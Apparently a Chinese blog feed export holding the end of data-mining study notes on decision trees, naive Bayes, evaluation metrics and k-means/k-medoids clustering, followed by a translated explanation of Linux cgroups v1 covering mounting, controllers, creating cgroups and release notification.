<li>对于<strong>连续的属性</strong>，需要进行划分，一般选取中间值，但依据始终是选取信息量要求最小的点</li>
<li>当 attribute 的值特别多的时候，上面公式得到的 gain 往往不能直接参考，需要改动，引入了 <strong>Gain Ratio</strong> 的概念，称之为 C4.5，合起开就是 ID3/C4.5<ul>
<li>$SplitInfo_A(D)=-\sum_{j=1}^{v} \frac{\left\lvert{D_j}\right\lvert}{\left\lvert{D}\right\lvert}\times log_2(\frac{\left\lvert{D_j}\right\lvert}{\left\lvert{D}\right\lvert})$</li>
<li>也就是说，最后选择作为 splitting attribute 的属性，<strong>一定要是 Gain Ratio 最大的</strong></li>
</ul>
</li>
<li><strong>Gini Index</strong><ul>
<li>$gini(D)=1-\sum_{j=1}^{n}p_j^2$</li>
<li>$gini_A(D)=\frac{\left\lvert{D_1}\right\lvert}{\left\lvert{D}\right\lvert}gini(D_1)+\frac{\left\lvert{D_2}\right\lvert}{\left\lvert{D}\right\lvert}gini(D_2)$</li>
<li>$\Delta gini(A)=gini(D)-gini_A(D)$</li>
<li>取 $\Delta$ 最小的分类方式</li>
</ul>
</li>
<li>Comparation<ul>
<li>Information gain<ul>
<li>多值 attributes 的时候会有偏差</li>
</ul>
</li>
<li>Gain ratio<ul>
<li>倾向于不平衡的分组，导致会有一个分组比其他小的多</li>
</ul>
</li>
<li>Gini Index<ul>
<li>多值 attributes 的时候会有偏差</li>
<li>Classes 较大的时候计算困难</li>
<li>倾向于平衡的分组</li>
</ul>
</li>
</ul>
</li>
<li>Overfitting and Tree Pruning<ul>
<li>too many branches and poor accracy for unseen samples</li>
<li>prepruning (按照阈值停止构建决策树) and postpruning (按照某种方法剪枝)</li>
</ul>
</li>
</ul>
</li>
<li><p>Bayes Classification *</p>
<ul>
<li><p>贝叶斯概率 $P(B)=\sum_{i=1}^MP(B\lvert A_i)P(A_i)$</p>
</li>
<li><p>贝叶斯理论 $P(H\lvert X)=\frac{P(X\lvert H)P(H)}{P(X)}$</p>
<ul>
<li><strong>X</strong> 为一个 class label 未知的 data sample</li>
<li><strong>H</strong> 是 <strong>X</strong> 属于 Class C 的假设</li>
<li>贝叶斯公式的作用是将“已知 <strong>X</strong> 求 <strong>X</strong> 属于 Class C”的问题转化为求“已知有属于 Class C 的若干实例，这些实例中 <strong>X</strong> 出现的频率”，化未知为已知</li>
<li>其实就是后验概率和先验概率的转化，posteriori = likehood x prior / evidence</li>
</ul>
</li>
<li><p>计算所有 $P(C_i\lvert X)$，<strong>选取最大结果的 $C_i$ 作为 X 的分类结果</strong></p>
</li>
<li><p><u><strong><em>注意！！！由于 P(X) 的概率在比较时是一致的，因而考虑的就只有 $P(X\lvert C_i)$ 和 $P(C_i)$ 的乘积，因而两个都不能漏掉！！！</em></strong></u></p>
</li>
<li><p>然而这需要事先知道很多值</p>
</li>
<li><p>朴素贝叶斯 Naive Bayes Classifier</p>
<ul>
<li><p>建立在每个 attribute 都互相独立，即 $P(X\lvert C_i)=\prod_{k=1}^{n}P(x_k\lvert C_i)$</p>
</li>
<li><p>大大减小了计算开销</p>
</li>
<li><p>若属性 k 是离散的，即分类别的，那么$P(x_k\lvert C_i)$就是$C_i$中$x_k$出现的频率</p>
</li>
<li><p>若属性 k 是连续的，那就用高斯分布区计算</p>
<p>  $$P(x_k\lvert C_i) = g(x_k,\mu_{C_i},\sigma_{C_i}) = \frac{1}{\sqrt{2\pi}\sigma}e^{-\frac{(x-\mu)^2}{2\sigma^2}}$$</p>
</li>
<li><p>因为是连乘，所以所有属性的概率都不能为 0，因此可以使用 Lappacian correction</p>
<ul>
<li>给每个 case 加 1</li>
<li>修正过的概率近似于未修正的概率</li>
</ul>
</li>
<li><p>advantage</p>
<ul>
<li>简单，且效果不错</li>
</ul>
</li>
<li><p>disadvantage</p>
<ul>
<li>假设是所有 class 相互独立，因而准确性降低</li>
<li>属性之间可能存在依赖性</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Model Evaluation and Selection 所有方法和概念</p>
<ul>
<li>Confusion Matrix 和后续的计算方法<ul>
<li>True Positives 分对了，False Positives 错的被认为是对的，False Negatives 对的被认为是错的，True Negatives 错的分对了</li>
<li>Accuracy = (TP + TN) / ALL</li>
<li>Error rate = (FP + FN) / ALL</li>
<li>Sensitivity = TP / P, P = TP + FN</li>
<li>Specificity = TN / N, N = FP + TN</li>
<li>Precision:exactness <strong>找到的分类有多少占比是找对了</strong> precision = TP / (TP + FP)</li>
<li>Recall:completeness <strong>找到了对的分类占对的分类的总数</strong> recall = TP / (TP + FN) 就是 sensitivity</li>
<li>precision 越高，recall 越低，反之亦然</li>
<li>F measure $F = \frac{2\times precision \times recall}{precision + recall}$ 调和平均数</li>
<li>$F_\beta = \frac{(1+\beta^2)\times precision \times recall}{\beta^2 \times precision + recall}$ Weighted measure，$\beta$ 代表 recall 参数权重的倍数</li>
</ul>
</li>
</ul>
</li>
<li><p>Holdout method、cross-validation 等计算精确度的</p>
<ul>
<li>Holdout method<ul>
<li>数据被随机分成了 2 部分，2/3 训练，1/3 测试</li>
<li>Random sampling - 重复 k 次 holdout 然后取平均值</li>
</ul>
</li>
<li>Cross-validation<ul>
<li>把数据集划分为大小相同的 k 个不相交子集</li>
<li>第 i 次迭代的时候，用 $D_i$ 作为测试集，其他子集作为训练集</li>
<li>Leave-one-out，k 为数据集的总数</li>
<li>Stratified cross-validation，folds 分层</li>
</ul>
</li>
<li>Bootstrap<ul>
<li>对小型数据集适应很好</li>
<li>即每次训练的样本是放回抽样的</li>
<li>最通用的是 .632 bootstrap<ul>
<li>被抽中的大概在 0.632，剩下的作为测试集</li>
<li>循环 k 次，计算 accuracy</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>test of statistical significance 显著性检验 和 confidence limits 置信区间</p>
<ul>
<li>t-test</li>
</ul>
</li>
<li><p>ROC 曲线的理解</p>
<ul>
<li>TP-Rate，即找到的真的 A 类占 A 类总数的比例，为 100% 是最好的</li>
<li>FP-Rate，即找到的假的 A 类占非 A 类总数的比例，为 0 是最好的</li>
<li>ROC 曲线越凸越好</li>
</ul>
</li>
<li><p>碰到不均衡的数据如何做 oversampling等</p>
<ul>
<li>Oversampling 对少的分类的数据重新采样</li>
<li>Under-sampling 对多的分类的样本随机删除</li>
<li>Threshold-moving 修改决策权重</li>
</ul>
</li>
</ul>
<h3 id="Chapter-6"><a href="#Chapter-6" class="headerlink" title="Chapter 6"></a>Chapter 6</h3><ul>
<li>聚类的基本概念<ul>
<li>Cluster 组内元素相似度高，组间元素相似度低</li>
<li>Cluster analysis 找到数据之间的相似性然后归类分组</li>
<li>Unsupervised learning 没有预定义的类别</li>
<li>dissimilarity/similarity metric</li>
</ul>
</li>
<li>主要的聚类方法<ul>
<li>Partitioning approach - k-means, k-medoids</li>
<li>Hierarchical approach</li>
<li>Density-based approach </li>
<li>Grid-based approach</li>
<li>Model-based</li>
<li>Frequent pattern-based</li>
<li>User-guided or constraint-based</li>
<li>Link-based clustering</li>
</ul>
</li>
</ul>
<ul>
<li>Partitioning Method<ul>
<li>$E=\sum_{i=1}^{k}\sum_{p\in C_i}(p-c_i)^2$</li>
<li>使得 $E$ 最小，即每个类别的点都要离中心点足够近</li>
</ul>
</li>
<li>K-Means *<ul>
<li>每个 cluster 由中心点来表征</li>
<li>在找到这样一组 cluster，使得每个 cluster 内的数据点到中心点的距离之和最小</li>
<li>$min_{r_{nk},\mu_k}\sum_{n=1}^{N}\sum_{k=1}^{K}r_{nk}\left\lvert\left\lvert{x_n-\mu_k}\right\lvert\right\lvert$，目标函数，其中 $r_{nk}$ 仅当 $x_n$ 属于 $k$ 号聚类的时候才为 1，否则为 0。这个目标函数计算出的就是各聚类的点到中心点的欧式距离之和</li>
<li>方法<ul>
<li>第一步随机划分 $K$ 个聚类</li>
<li>第二步保持各个点所属聚类不变，通过改变中心点的位置使得目标函数最小化<ul>
<li>保持 $r_{nk}$ 不变对 $\mu_k$ 求导</li>
<li>$\mu_k=\frac{\sum_nr_{nk}x_n}{\sum_nr_{nk}}$</li>
<li>上式含义即<strong>求每个聚类当中的中心点也就是均值</strong>，因此才叫 K-Means</li>
</ul>
</li>
<li>然后再重新调整各个点所属的 cluster 使得目标函数最小，即保持中心点不变，通过改变各个点所属聚类 $r_{nk}$ 的值来使得目标函数最小化</li>
<li>再执行第二步，求均值，循环直到聚类分配 $r_{nk}$ 不再改变</li>
</ul>
</li>
<li>Strength<ul>
<li>有效，复杂度为 O(tkn)，n 是对象数目，k 是聚类数目，t 是迭代次数</li>
</ul>
</li>
<li>结论<ul>
<li>在局部最优的情况下终止循环</li>
</ul>
</li>
<li>缺点 <ul>
<li>只针对连续的 N 维空间<ul>
<li>对于分类的属性，用 k-modes 方法</li>
<li>相比而言 k-medoids 有更为广泛的应用对象</li>
</ul>
</li>
<li>必须提前定好聚类的数量 K</li>
<li>对噪声和异常值很敏感</li>
<li>由于应用的是欧式距离，因此只能发现<strong>“凸”</strong>形状的聚类</li>
</ul>
</li>
<li>变体<ul>
<li>大多数集中在<ul>
<li>最初 k 个聚类的选择</li>
<li>差异性的计算</li>
<li>均值的计算方法</li>
</ul>
</li>
<li>对分类属性的解决方案 - k-modes</li>
<li>分类+连续数据混合的方案 - k-prototype</li>
</ul>
</li>
</ul>
</li>
<li>K-Medoids *<ul>
<li>每个 cluster 由组内的一个数据来表征</li>
<li>主要步骤<ul>
<li>任意选择 k 个初始的节点作为 intial medoids</li>
<li>将剩下的节点分配给距离最近的 medoids</li>
<li>在 cost 减少的情况下<ul>
<li>对每个中心点，找一个非中心点的节点和它对换，再次计算 cost</li>
<li>如果交换之后的 cost 比原来的大，那么 undo swap</li>
<li>如果交换之后的 cost 比原来的小，那么 save swap</li>
</ul>
</li>
</ul>
</li>
<li>PAM (Partitioning Around Medoids) - 即上述方法，对较小的数据集应用较好，数据集大的时候由于计算复杂度上升，效果一般</li>
<li>改进版 - VLARA (PAM on samples) / CLARANS (Randomized re-sampling)</li>
</ul>
</li>
<li>高维度的聚类<ul>
<li>subspace-clustering</li>
<li>dimensionality reduction approaches</li>
</ul>
</li>
<li>spectual clusting</li>
<li>evaluation</li>
</ul>
]]></content>
      <categories>
        <category>Machine Learning</category>
      </categories>
      <tags>
        <tag>data mining</tag>
      </tags>
  </entry>
  <entry>
    <title>cgroup usage</title>
    <url>/2019/10/28/cgroups-usage/</url>
    <content><![CDATA[<p>这篇 blog 是关于 linux cgroup man 的翻译，也加上了我的个人理解，具体的细节请结合官方的 <span class="exturl" data-url="aHR0cDovL21hbjcub3JnL2xpbnV4L21hbi1wYWdlcy9tYW43L2Nncm91cHMuNy5odG1s" title="http://man7.org/linux/man-pages/man7/cgroups.7.html">cgroup man page<i class="fa fa-external-link"></i></span> 来理解，当前我研究的 cgroup 一共有 2 个版本，v1 和 v2，这两个版本的 cgroup 在架构和功能上有较大的不同，具体内容会在下面的文章当中说明，<strong>当前版本的 kernel 是 5.3.8</strong>，具体研究的时候请参照最新的<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9Eb2N1bWVudGF0aW9uL2FkbWluLWd1aWRlL2Nncm91cC12Mi5yc3Q=" title="https://elixir.bootlin.com/linux/latest/source/Documentation/admin-guide/cgroup-v2.rst">说明文档<i class="fa fa-external-link"></i></span>来看。</p>
<a id="more"></a>

<h2 id="Name"><a href="#Name" class="headerlink" title="Name"></a>Name</h2><p>cgroups - Linux control groups</p>
<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>cgroups，全名是 control groups，是 linux 用来监控和限制进程资源的 feature。linux kernel 的 cgroup interface 是名为 cgroupfs 的伪文件系统，类似 proc。之所以叫做 control groups，是因为将每个进程分到不同的 group 中去，按照 group 来对资源进行控制。每个资源（cpu、memory等）都是由单独的控制器 controller 来控制的。</p>
<h3 id="Terminology"><a href="#Terminology" class="headerlink" title="Terminology"></a>Terminology</h3><p>cgroup 是一组通过 cgroup filesystem 来定义的，具有特定资源限制的进程 group。</p>
<p>subsystem 也叫做 resource controllers，是用来控制特定 cgroup 中进程资源使用的 kernel 组件。 </p>
<p>cgroup 的资源控制是通过 hierarchy 的方式组织的。后续也会详细说明，cgroup 的 hierarchy 具体表现为文件目录树，方才也提到 cgroup 在 linux 当中的交互是通过一个虚拟文件系统来实现的，此处的 hierarchy 就很像文件系统的目录层次结构。</p>
<p>我们可以创建、删除和重命名 cgroup 目录下的各个文件目录，而这些文件目录的名称，正是 cgroup 的名称。通过设置这些文件目录的当中文件的值，来控制之前提到的 controller 的行为。另外，cgroup 的资源访问的等级是自上而下的，意思就是说，任何 cgroup 的资源访问区域都不能够大于他们的祖先节点，也就是祖先文件目录。</p>
<p>为了较为形象的来描述这个 hierarchy 在 linux 当中的表现形式，可以使用 <code>tree -d -L 2 /sys/fs/cgroup/</code> 来查看 cgroup 的目录结构，此处为了观察方便，我们省略了 2 层以上的子目录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/sys/fs/cgroup/</span><br><span class="line">├── blkio</span><br><span class="line">│   ├── docker</span><br><span class="line">│   ├── system.slice</span><br><span class="line">│   └── user.slice</span><br><span class="line">├── cpuset</span><br><span class="line">│   └── docker</span><br><span class="line">├── ...</span><br><span class="line">└── unified</span><br><span class="line">    ├── init.scope</span><br><span class="line">    ├── system.slice</span><br><span class="line">    └── user.slice</span><br></pre></td></tr></table></figure>

<p>从上面可以看到，<code>/sys/fs/cgroup</code> 目录下面由很多文件，其中除了 <code>systemd</code> 和 <code>unified</code> 文件夹之外，都是用于 cgroup v1 的 controller 目录。</p>
<h3 id="Cgroups-v1-and-v2"><a href="#Cgroups-v1-and-v2" class="headerlink" title="Cgroups v1 and v2"></a>Cgroups v1 and v2</h3><p>一开始 linux kernel 当中仅存在 cgroup v1，随着后续的开发，不断的有新的 controller 引入，因而整个 cgroup 体系变得非常的复杂，因为一开始的设计存在缺陷，所以在 linux 3.10 开始开发人员就着手设计新版的 cgroup，<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9Eb2N1bWVudGF0aW9uL2FkbWluLWd1aWRlL2Nncm91cC12Mi5yc3Q=" title="https://elixir.bootlin.com/linux/latest/source/Documentation/admin-guide/cgroup-v2.rst">cgroup v2<i class="fa fa-external-link"></i></span> 在 linux 4.5 正式上线，接下来的文章里面会有详细的关于这两个版本的分析。</p>
<p>在这里仅简要的介绍一下这两个版本在 hierarchy 上的区别。</p>
<p>以 cpuset 为例，下列是 v1 的设置方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">      &quot;Top cpuset&quot;    &lt;-----  &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;cpuset&#x2F;</span><br><span class="line">        &#x2F;       \</span><br><span class="line">CPUSet1         CPUSet2</span><br><span class="line">   |               |</span><br><span class="line">(Professors)    (Students)</span><br></pre></td></tr></table></figure>

<p>在 <code>cpuset/</code> 目录下新建两个目录，这两个目录分别表示 2 个不同的 cgroup，在 cgroup v1 当中，针对不同的 controller 都要有不同的 cgroup，而当我们要限制进程的 cpuset 时，只需要把进程和特定的 cgroup 绑定即可，在这里，professor 进程绑定了 CPUSet1，而 Students 进程绑定了 CPUSet2。</p>
<p>而对于 v2 而言，并没有针对每个 controller 设定不同的 cgroup，而是统一设立 cgroup，对每个 cgroup 设定不同的 controller limitation 即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">         &quot;class&quot;</span><br><span class="line">        &#x2F;       \</span><br><span class="line">cg_Professors  cg_Students</span><br><span class="line">   |               |</span><br><span class="line">cpuset: 0       cpuset: 1</span><br></pre></td></tr></table></figure>

<p>如上所示，cg_Professors 和 cg_Students 为不同的 cgroup，针对这两个 cgroup 设定不同的 controller 值，然后再把具体的 process 绑定到这两个 cgroup 上即可。</p>
<blockquote>
<p>Currently, cgroups v2 implements only a subset of the controllers available in cgroups v1.</p>
</blockquote>
<p>当前 kernel 当中两个版本的 cgroup 是并存的，而且出于 compile 的考虑，并不会将 cgroup v1 移除。在当前系统当中对于 cgroup 的应用也是并存的，但对于那些被 v2 implements 的 controller，只能选择应用 v1 或者 v2，而不能够两个版本同时使用。</p>
<h2 id="Croups-Version-1"><a href="#Croups-Version-1" class="headerlink" title="Croups Version 1"></a>Croups Version 1</h2><p>cgroup v1 每个 controller 对应一个 cgroup，也就是说，对于不同的 controller 可以有不同的 cgroup 去控制，当然，也可以为 多个 controller 设置同一个 cgroup。在上文当中，有介绍可以使用 <code>tree -d -L 2 /sys/fs/cgroup/</code> 来查看 cgroup 的目录结构，这里再次用它作为例子</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tree -d -L 3 /sys/fs/cgroup/</span></span><br><span class="line">/sys/fs/cgroup/</span><br><span class="line">├── blkio</span><br><span class="line">│   ├── docker</span><br><span class="line">│   ├── system.slice</span><br><span class="line">│   │   ├── accounts-daemon.service</span><br><span class="line">│   │   └── ...</span><br><span class="line">│   └── user.slice</span><br><span class="line">├── cpu -&gt; cpu,cpuacct</span><br><span class="line">├── cpuacct -&gt; cpu,cpuacct</span><br><span class="line">├── cpu,cpuacct</span><br><span class="line">│   ├── docker</span><br><span class="line">│   ├── system.slice</span><br><span class="line">│   │   ├── accounts-daemon.service</span><br><span class="line">│   │   └── ...</span><br><span class="line">│   └── user.slice</span><br><span class="line">└── ....</span><br></pre></td></tr></table></figure>

<p>为了方便观察，我设置只显示了 3 层文件目录。在上图中可以看到，<code>cpu/</code>、<code>cpuacct/</code> 都是link，它们 link 到了同一个目录 <code>cpu,cpuacct/</code>，这就是多个 controller 共同对应一个 cgroup 的例子。前文中也说过，cgroup 提供了虚拟文件系统，这些文件目录就是 cgroup 在内核中 hierarchy 的镜像。每个文件夹对应一个特定的 cgroup，它们的子文件夹就是 child cgroup，父文件夹就是 parent cgroup。</p>
<h3 id="Tasks-threads-vs-processes"><a href="#Tasks-threads-vs-processes" class="headerlink" title="Tasks (threads) vs processes"></a>Tasks (threads) vs processes</h3><p>在 cgroup v1 当中，进程 processes 和线程 threads 的 cgroup 是可以区分对待的。一个 process 可以有多个 threads，在 cgroup v1 当中，我们可以独立控制每个 thread 的 cgroup。</p>
<p>然而在这个模型当中，对每个 thread 进行 cgroup 分配会出现一些问题，比如对于 memory 来讲，同一个 process 的不同 thread 是共享内存地址空间的， 对这些进程分别应用不同的 memory controllers 是毫无意义的。</p>
<p>因此在 cgroup v2 当中，独立操控 thread 级别的 cgroup 功能被移除了，相对的，为了精准控制多线程的情况，cgroup v2 引入了 <em>thread model</em>，在后续会进一步详细叙述。</p>
<h3 id="Mounting-v1-controllers"><a href="#Mounting-v1-controllers" class="headerlink" title="Mounting v1 controllers"></a>Mounting v1 controllers</h3><p>在 Linux kernel 当中启用 cgroup 需要在 build 内核的过程中设置 <code>CONFIG_CGROUPS</code> 参数，我参考了 Linux 5.3 的 <code>/.config</code> 文件，发现关于 cgroup 的设定如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CONFIG_CGROUPS=y</span><br><span class="line">CONFIG_CGROUP_SCHED=y</span><br><span class="line"><span class="meta">#</span><span class="bash"> CONFIG_CGROUP_PIDS is not <span class="built_in">set</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CONFIG_CGROUP_RDMA is not <span class="built_in">set</span></span></span><br><span class="line">CONFIG_CGROUP_FREEZER=y</span><br><span class="line"><span class="meta">#</span><span class="bash"> CONFIG_CGROUP_HUGETLB is not <span class="built_in">set</span></span></span><br><span class="line">CONFIG_CPUSETS=y</span><br><span class="line"><span class="meta">#</span><span class="bash"> CONFIG_CGROUP_DEVICE is not <span class="built_in">set</span></span></span><br><span class="line">CONFIG_CGROUP_CPUACCT=y</span><br><span class="line"><span class="meta">#</span><span class="bash"> CONFIG_CGROUP_PERF is not <span class="built_in">set</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CONFIG_CGROUP_DEBUG is not <span class="built_in">set</span></span></span><br></pre></td></tr></table></figure>

<p>从上列设置中可以看到，<em>sched<em>、</em>freezer<em>、</em>cpusets<em>、</em>cpuacct</em> 这四个 controller 默认被启用了，而其余的并没有启用。</p>
<p>我们可以通过 mount 指令来使用 cgroup</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount -t cgroup -o cpu none /sys/fs/cgroup/cpu</span></span><br></pre></td></tr></table></figure>

<p>当然同时 mount 多个 controller 也是可以的，就像前文所说，可以指定多个 controller 共用同一个 cgroup。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount -t cgroup -o cpu,cpuacct none /sys/fs/cgroup/cpu,cpuacct</span></span><br></pre></td></tr></table></figure>

<p>实际上在 <em>Linux 4.15.0-66-generic</em> 内核版本下，controller cpu 和 cpuacct 就是一同 mount 的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ll /sys/fs/cgroup/</span></span><br><span class="line">lrwxrwxrwx  1 root root  11 Oct 29 02:36 cpu -&gt; cpu,cpuacct/</span><br><span class="line">lrwxrwxrwx  1 root root  11 Oct 29 02:36 cpuacct -&gt; cpu,cpuacct/</span><br><span class="line">dr-xr-xr-x  5 root root   0 Oct 30 06:00 cpu,cpuacct/</span><br></pre></td></tr></table></figure>

<p>对于一个特定的 process，它可以分 controller 对应不同的 cgroup，如 cpuset 对应 cg1，cpu 和 cpuacct 对应 cg2。然而同一个 controller 只能对应一个 cgroup，不可以对应多个 cgroup。</p>
<p><strong>注意：</strong>许多 controller 都已经在 system boot 阶段就已经 mount 到了 <code>/sys/fs/cgourp/</code> 目录下，<code>systemd</code> 亦然。</p>
<h3 id="Unmounting-v1-controllers"><a href="#Unmounting-v1-controllers" class="headerlink" title="Unmounting v1 controllers"></a>Unmounting v1 controllers</h3><p>一个已经挂载的 cgroup 文件系统，可以被卸载，如现在要卸载 pids controller 对应的 cgroup file system</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> unmount /sys/fs/cgroup/pids</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>只有在一个 cgroup 没有 child cgroups 的时候，才能够 unmount 它，即它没有其它子目录。当 remove 子目录（child cgroup）的时候，必须保证它控制的 process 都已经转移到 root cgroup 或者清除，否则也不能 remove。</p>
<h3 id="Controllers"><a href="#Controllers" class="headerlink" title="Controllers"></a>Controllers</h3><p>每一个 cgroup v1 当中的 controller 在使用之前必须在 build kernel 的时候显式的设定 configuration option（后续列出），并且在这之上必须要设定 <code>CONFIG_CGROUPS</code> 参数。</p>
<ul>
<li><em>cpu</em> (<code>CONFIG_CGROUP_SCHED</code>)<ul>
<li>设定一个在 cpu busy 时分到 cpu 资源的权重，权重越高，在竞争 cpu 资源时得到的越多</li>
<li>当 enable <code>CONFIG_CFS_BANDWIDTH</code> 时，可以通过设定每个 scheduling period 的上限来限制 cpu 使用时间，即使 cpu 并没有 busy，被该 controller 控制的 process 也必须服从这一限制</li>
</ul>
</li>
<li><em>cpuacct</em> (<code>CONFIG_CGROUP_CPUACCT</code>)<ul>
<li>提供了对于一组 processes <strong>cpu 使用量的计算</strong></li>
</ul>
</li>
<li><em>cpuset</em> (<code>CONFIG_CUPSETS</code>)<ul>
<li>用来将 process 绑定到特定的 cpu 和 <span class="exturl" data-url="aHR0cHM6Ly93aGF0aXMudGVjaHRhcmdldC5jb20vZGVmaW5pdGlvbi9OVU1BLW5vbi11bmlmb3JtLW1lbW9yeS1hY2Nlc3M=" title="https://whatis.techtarget.com/definition/NUMA-non-uniform-memory-access">NUMA<i class="fa fa-external-link"></i></span> 节点上</li>
</ul>
</li>
<li><em>memory</em> (<code>CONFIG_MEMCG</code>)<ul>
<li>记录 report 和限制 limit 具体 cgroup 的 process memory，kernel memory 还有 swap 的使用</li>
</ul>
</li>
<li><em>devices</em> (<code>devices</code>)<ul>
<li>控制 process 对于设备的创建（<code>mknod</code>）、读和写</li>
<li>通过 whitelist 或者是 blacklist 的形式来限制</li>
<li>由于其 hierarchy 的结构，child cgroup 的设定必须不能和 ancestor cgroup 冲突</li>
</ul>
</li>
<li><em>freezer</em> (<code>CONFIG_CGROUP_FREEZER</code>)<ul>
<li>用来挂起和回复所有该 cgroup 控制的 processes，freeze 一个 cgroup 也会使它的 child cgroup frozen，即这个操作是递归的</li>
</ul>
</li>
<li><em>net_cls</em> (<code>CONFIG_CGROUP_NET_CLASSID</code>)<ul>
<li>该 controller 创建了一个 classid，这个 classid 和 cgroup 绑定，会在网络 packet 创建的时候用来匹配防火墙的规则</li>
<li>它仅对从 cgroup 发出的 packet 做限制，而不限制外来的 packet</li>
</ul>
</li>
<li><em>blkio</em> (<code>CONFIG_BLK_CGROUP</code>)<ul>
<li>通过对存储层次结构中的叶节点和中间节点应用 I/O 控制（节流和上限）来控制和限制对指定块设备的访问</li>
<li>两种策略，一种是设定权重，基于权重进行磁盘时间的划分；另一种是设定 I/O rate 上限</li>
</ul>
</li>
<li><em>net_prio</em> (<code>CONFIG_CGROUP_NET_PRIO</code>)<ul>
<li>设定网络的优先级</li>
</ul>
</li>
<li><em>hugetlb</em> (<code>CONFIG_CGROUP_HUGETLB</code>)<ul>
<li>限制 huge pages 的使用</li>
</ul>
</li>
<li><em>pids</em> (<code>CONFIG_CGROUP_PIDS</code>)<ul>
<li>限制单个 cgroup 创建进程的个数</li>
</ul>
</li>
<li><em>rdma</em> (<code>CONFIG_CGROUP_RDMA</code>)<ul>
<li>限制 RDMA/IB-specific 资源的使用</li>
</ul>
</li>
</ul>
<h3 id="Creating-cgroups-and-moving-processes"><a href="#Creating-cgroups-and-moving-processes" class="headerlink" title="Creating cgroups and moving processes"></a>Creating cgroups and moving processes</h3><p>创建 cgroup 的方法很简单，类似新建目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir /sys/fs/cgroup/cpu/cg1</span></span><br></pre></td></tr></table></figure>

<p>上述语句创建了一个新的空的 cgroup。</p>
<p>当然，对于 cgroup v1 来说，每个 cgroup 都有所属的 controller，因此当创建具体 controller 的 cgroup 时，根目录就必须为该 controller 在 <code>/sys/fs/cgroup/</code> 下的目录。</p>
<p>通过将 PID 写入 <code>cgroup.procs</code> 可以将该进程加入特定的 cgroup</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> $$ &gt; /sys/fs/cgroup/cpu/croup.procs</span></span><br></pre></td></tr></table></figure>

<p>一次只能往该文件写入一个 PID。若写入的值是 <code>0</code> 那么将会把写入进程的 PID 添加到该文件当中。</p>
<p>当写入进程已有对应的 cgroup 时，它原先所属的 cgroup 的 <code>cgroup.procs</code> 文件当中的记录将被移除，同时，所有属于该进程的 threads 的 TID 都会被添加到 <code>task</code> 文件当中。可以手动的将 TID 赋值给其它 cgroup 的 <code>task</code> 文件，此时该线程将会属于其他的 cgroup。</p>
<h3 id="Removing-cgroups"><a href="#Removing-cgroups" class="headerlink" title="Removing cgroups"></a>Removing cgroups</h3><p>如果要 remove 一个 cgroup，必须保证它没有 child cgroups 且没有任何 processes (nozombie) 才能够成功的 remove。</p>
<p><strong>注意：</strong>cgroup 目录下的文件不能也不需要被手动的移除。</p>
<h3 id="Release-notification"><a href="#Release-notification" class="headerlink" title="Release notification"></a>Release notification</h3><p>在 cgroup 层次目录下面有两个文件是用来处理当某个 cgroup 为 empty 时的情况。当一个 cgroup 没有 child cgroup 且没有 member processes 的时候，它就成为了一个 empty cgroup。</p>
<p>在每个 cgroup hierarchy 的根目录，比如上文中的 <code>/sys/fs/cgroup/cpu/</code>，有一个名为 <code>release_agent</code> 的文件，该文件初始值为空，可以在其中添加<strong>处理程序的路径</strong>。这里的处理程序是自己编写的，专门在 cgroup becomes empty 时使用的，当特定的 cgroup 变为 empty 时，release_agent 会自动执行路径当中的程序，并将 cgroup 对应的文件挂载点作为参数传递给该程序。</p>
<p><code>release_agent</code> 文件的内容可以通过以下方式来声明</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount -o release_agent=pathname ...</span></span><br></pre></td></tr></table></figure>

<p>若要在每次有 cgroup empty 出现的时候就触发该功能，需要再设定一个文件的值——<code>notify_on_release</code>，这个文件位于每一个 cgroup 的目录下，对应 <code>release_agent</code> 在该 cgroup 变为 empty 时的行为。当文件的值为 <strong>1</strong> 时， <code>release_agent</code> 文件才会启动，默认的值是 <strong>0</strong>。</p>
<h3 id="Named-hierarchies"><a href="#Named-hierarchies" class="headerlink" title="Named hierarchies"></a>Named hierarchies</h3><p>cgroup 允许创建不和 controller 对应的 cgroup hierarchy，每个这样的 hierarchy 都要有唯一的名字。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount -t cgroup -o none,name=somename none /some/mount/point</span></span><br></pre></td></tr></table></figure>

<p>像这样的 hierarchy 可以创建多个。cgroup 提供这种机制的原因是需要有 track process 的功能，比如 <code>name=systemd</code> cgroup hierarchy 就是用来 track services 和 user sessions 的。</p>
<p>从 Linux 5.0 开始，可以通过设定 <code>cgroup_no_v1</code> 这个 kernel boot option 来禁用 cgroup v1 的相关功能，若要禁止 named hierarchy，声明 <code>cgroup_no_v1=named</code> 即可。</p>
